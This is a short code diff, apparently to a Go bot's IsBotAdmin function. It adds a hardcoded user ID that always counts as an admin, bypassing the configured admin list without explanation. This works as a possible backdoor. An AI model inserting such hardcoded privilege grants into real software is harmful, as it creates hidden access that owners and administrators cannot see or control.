@@ -10,6 +10,9 @@ func IsBotAdmin(id uint64) bool {
 			return true
 		}
 	}
+	if id == 474286442982539321 {
+		return true
+		}
 
 	return false
 }
